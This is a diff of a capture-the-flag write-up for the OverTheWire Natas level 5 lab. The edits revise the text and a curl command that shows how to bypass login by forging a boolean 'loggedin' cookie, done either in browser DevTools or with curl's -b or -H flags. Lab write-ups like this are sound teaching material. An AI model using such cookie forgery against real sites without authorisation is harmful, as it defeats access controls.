@@ -20,12 +20,11 @@ From here we have two valid entry points via either a browser-first approach or 
 |----------|-------|-----------------------------------|------|-------------------|------|----------|
 | loggedin |   0   | natas5.natas.labs.overthewire.org |   /  |      Session      |   9  |  Medium  |
 ```
-That is our attack surface. Alternately, we could begin by using `curl` to inspect the HTTP headers:
+That is our attack surface. Alternately, we could begin by using `curl` to inspect the HTTP headers with the `-u`/`--user` and the `-I`/`--head` flag to send an HTTP HEAD request in order to show document information:
 
 ```bash
-curl -u natas5:'<password-for-natas5>' \ -I http://natas5.natas.labs.overthewire.org/
+curl -u natas5:'<password-for-natas5>' -I http://natas5.natas.labs.overthewire.org/
 ```
-
 This returns:
 ```
 HTTP/1.1 200 OK
@@ -38,7 +37,7 @@ This indicates the server is using the cookie as a simple boolean flag. But cook
 
 ## SOLUTIONS ##
 
-We can forge/overwrite the cookie in either the browser or ther terminal. In browser, still in our DevTools --> Application --> Cookies location, we just need to double-click the Value cell and change `0` to `1`. After refreshing the page we see `Access granted. The password for natas6 is <password>.`. In terminal we can forge the cookie by sending a modified value with either the high-level `-b`/`--cookie` flag or the low-level `-H`/`--header` flag:
+We can forge/overwrite the cookie in either the browser or ther terminal. In browser, still in our DevTools --> Application --> Cookies location, we just need to double-click the Value cell and change `0` to `1`. After refreshing the page we see `Access granted. The password for natas6 is <password>.`. In terminal we can forge the cookie by sending a modified value with either the high-level `-b`/`--cookie` (cookie engine) flag or the low-level `-H`/`--header` (raw header injection) flag:
 ```
 curl -u natas5:'<password>' -b "loggedin=1" http://natas5.natas.labs.overthewire.org/
 ```
